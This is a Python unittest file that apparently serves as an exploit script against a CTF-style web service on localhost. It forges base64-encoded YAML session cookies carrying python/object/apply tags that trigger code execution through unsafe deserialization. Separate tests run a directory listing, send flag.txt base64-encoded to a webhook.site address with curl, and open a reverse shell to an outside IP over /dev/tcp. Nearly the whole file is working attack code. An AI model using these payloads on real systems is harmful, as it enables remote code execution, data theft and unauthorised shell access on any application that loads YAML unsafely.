import unittest
import requests as req
import yaml
from base64 import b64encode

class TestLogic(unittest.TestCase):
    def test_get_cookies(self):
        with req.Session() as s:
            s.get('http://127.0.0.1:7172', allow_redirects=True)
            cookies = s.cookies.get('session')
            print(f'Cookies: {cookies}')
            self.assertIsNotNone(cookies)

    def test_get_files(self):
        with req.Session() as s:
            payload = '''
            !!map {
                ? !!str "nickname"
                : !!python/object/apply:subprocess.check_output ["ls"],
                ? !!str "role"
                : !!str "Admin",
                ? !!str "created_at"
                : !!int 1234
            }
            '''.encode()
            cookies = {'session': b64encode(payload).decode()}
            r = s.get('http://127.0.0.1:7172/user/get', cookies=cookies)
            self.assertEqual(r.status_code, 200)



    def test_get_flag(self):
        with req.Session() as s:
            payload = '''
            !!map {
                ? !!str "nickname"
                : !!python/object/apply:os.system ["curl https://webhook.site/5aa4c7da-6af9-470a-bf59-e9c8b8796339?`cat flag.txt | base64`"],
                ? !!str "role"
                : !!str "Admin",
                ? !!str "created_at"
                : !!int 1234
            }
            '''.encode()
            cookies = {'session': b64encode(payload).decode()}
            r = s.get('http://127.0.0.1:7172/user/get', cookies=cookies)
            print(r.text)
            self.assertEqual(r.status_code, 200)
            print('flag.txt найден')
            print('Флаг в base64 успешно отправлен')

    def test_reverse_shell(self):
        with req.Session() as s:
            payload = '''
            !!map {
                ? !!str "nickname"
                : !!python/object/apply:os.system ["sh -i >& /dev/tcp/149.154.71.26/1488 0>&1"],
                ? !!str "role"
                : !!str "Admin",
                ? !!str "created_at"
                : !!int 1234
            }
            '''.encode()
            cookies = {'session': b64encode(payload).decode()}
            r = s.get('http://127.0.0.1:7172/user/get', cookies=cookies)
            print(r.text)
            self.assertEqual(r.status_code, 200)
            print('Пейлоад для развёртки reverse-shell отправлен')
if __name__ == '__main__':
    unittest.main()